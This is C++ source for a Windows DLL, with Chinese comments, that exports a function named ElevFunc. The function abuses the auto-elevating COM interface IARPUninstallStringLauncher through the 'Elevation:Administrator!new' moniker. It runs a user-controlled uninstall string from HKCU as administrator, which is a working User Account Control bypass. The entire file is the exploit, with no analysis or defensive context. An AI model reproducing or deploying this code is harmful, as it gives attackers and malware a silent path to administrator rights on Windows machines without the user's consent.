// com_dll.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <windows.h>
#include <Strsafe.h>
#include <atlconv.h>
struct IARPUninstallStringLauncher;
typedef struct IARPUninstallStringLauncherVtbl {
	HRESULT(_stdcall *QueryInterface)(
		__RPC__in IARPUninstallStringLauncher * This,
		 REFIID riid,
		  void **ppvObject);

	ULONG(_stdcall *AddRef)(
		__RPC__in IARPUninstallStringLauncher * This);

	ULONG(_stdcall *Release)(
		__RPC__in IARPUninstallStringLauncher * This);

	HRESULT(_stdcall *LaunchUninstallStringAndWait)(
		__RPC__in IARPUninstallStringLauncher * This,
		_In_ HKEY hKey,
		_In_ LPCOLESTR Item,
		_In_ BOOL bModify,
		_In_ HWND hWnd);

	HRESULT(_stdcall *RemoveBrokenItemFromInstalledProgramsList)(
		__RPC__in IARPUninstallStringLauncher * This,
		_In_ HKEY hKey,
		_In_ LPCOLESTR Item);
}IARPUNINSTALLSTRINGLAUNCHERVTBL, *PIARPUNINSTALLSTRINGLAUNCHERVTBL;

typedef struct IARPUninstallStringLauncher
{
	IARPUninstallStringLauncherVtbl *lpVtbl;
}IARPUNINSTALLSTRINGLAUNCHER, *PIARPUNINSTALLSTRINGLAUNCHER;


#pragma comment(linker, "/export:ElevFunc=_ElevFunc@16")
extern "C" _declspec(dllexport) void CALLBACK ElevFunc(
	HWND hwnd,
	HINSTANCE hinst,
	LPTSTR lpCmdLine,
	INT nCmdShow
) {
	CLSID  clsid;
	IID iid;
	HRESULT hr;
	BIND_OPTS3 bo;
	WCHAR  szElevationMoniker[300];
	PIARPUNINSTALLSTRINGLAUNCHER ppv;
	// 获取提权com接口
	if (IIDFromString(L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}", &clsid) ||
		IIDFromString(L"{F885120E-3789-4FD9-865E-DC9B4A6412D2}", &iid))
		return;
	CoInitialize(NULL);
	hr = StringCchPrintf(szElevationMoniker, sizeof(szElevationMoniker) / sizeof(szElevationMoniker[0]),
		L"Elevation:Administrator!new:%s", L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}");
	if (FAILED(hr))
		return;
	memset(&bo, 0, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	hr = CoGetObject(szElevationMoniker, &bo, iid, (void**)&ppv);
	// 调用HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\下的test程序
	if (SUCCEEDED(hr))
	{
		ppv->lpVtbl->LaunchUninstallStringAndWait(ppv, 0, L"test", 0, NULL);
		ppv->lpVtbl->Release(ppv);
	}
	CoUninitialize();
	ExitProcess(0);
	return;
}
